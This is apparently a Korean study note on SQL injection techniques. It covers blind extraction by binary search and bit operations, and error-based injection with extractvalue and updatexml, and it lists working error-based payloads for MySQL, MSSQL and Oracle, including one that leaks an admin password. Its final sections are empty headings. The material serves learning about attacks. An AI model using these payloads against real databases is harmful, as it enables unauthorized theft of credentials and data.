# ExploitTech

## Binary Search <br/>
이진 탐색은 이미 정렬된 리스트에서 임의의 값을 효율적으로 찾기 위한 알고리즘. 임의의 값을 찾기 위해 검색 범위를 좁혀나감. <br/>
1. 범위 지정 <br/>
0부터 100까지 사이의 범위 내에 한 숫자만이 정답일 때 범위의 중간 값 지정(50) <br/>
2. 범위 조절 <br/>
정답이 50보다 큰값인지 확인. 그렇다면 51~100으로, 아니라면 0~49로 조정. 이 과정을 반복하면서 범위를 좁혀가며 정답을 찾음. <br/>

> example
> username : admin / password : P@ssword
> 비밀번호에 포함될 수 있는 아스키에서 출력 가능한 문자의 범위는 32~126임
> 중간값인 79보다 큰값인지 확인
> 이러한 과정을 반복 또는 쿼리로 사용
> 
> select * from users where username='admin' and ascii(substr(password, 1,1)) > 79;

<br/>
<br/>

## Bit 연산<br/>
ASCII는 0부터 127 범위의 문자를 표현할 수 있으며, 이는 곧 7개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미. <br/>
하나의 비트는 0과 1로 이뤄져 있으므로 7개의 비트에 대해 1인지 비교하면 총 7번의 쿼리로 임의 데이터 한 바이트를 알아낼 수 있음. <br/>
MySQL의 경우 숫자를 비트 형태로 변환하는 bin이라는 함수 제공. <br/>

> example
> username : admin / password : P@ssword
> 첫번째 글자인 P의 경우 비트로 바꾸면 1010000임
> 따라서 substr을 통해서 1이 있는지 없는지를 확인하면 됨
> select * from users where username = 'admin' and substr(bin(ord(password)), 1, 1) = 1

<br />
<br />

## Error based SQL Injection <br/>
임의로 에러를 발생시켜 데이터베이스 및 운영 체제의 정보를 획득하는 공격 기법. 프레임워크 마다 다르지만 debug 모드를 킨 경우 오류에 대한 상세한 내용이 나올 수 있음. <br/>
중요정보를 노출시키기 위해 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌 런타임(Runtime) 즉, 쿼리가 실행되고나서 발생하는 에러가 필요함. <br/>
아래의 구문은 MySQL 환경에서 해당 기법으로 공격할 때 많이 사용하는 구문임.
```MySQL
    select extractvalue(1, concat(0x3a, version()));
    ERROR 1105 (HY000) : XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
```
위 처럼 에러메시지에 운영 체제에 대한 정보가 포함되어 있음. 해당 쿼리를 이해하려면 extractvalue 함수를 알아야함. <br/>

### extractvalue <br/>
첫번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출. 만약 두 번째 인자가 올바르지 않은 XPATH 식일 경우 올바르지 않은 XPATH 식이라는 에러와 함께 잘못된 식을 출력함.<br/>
이를 응용해서 데이터베이스의 정보를 추출할 수도 있음.
```MySQL
    select extractvalue(1, concat(0x3a, (select password from users where username='admin')));
    ERROR 1105 (HY000) : XPATH syntax error : ':Th1s_1s_admin_PASSW@rd'
```

### 각 DBMS별 Error based SQLI <br/>
- MySQL
    - SELECT updatexml(null,concat(0x0a,version()),null);
    - SELECT extractvalue(1,concat(0x3a,version()));
    - SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
- MSSQL
    - SELECT convert(int,@@version);
    - SELECT cast((SELECT @@version) as int);
- ORACLE
    - SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;

## Error based Blind SQL Injection <br/>
앞서 알아본 Blind SQL과 Error based SQLI를 동시에 활용하는 공격 기법.

## Short-circuit evaluation <br/>

## Time based SQL Injection <br/>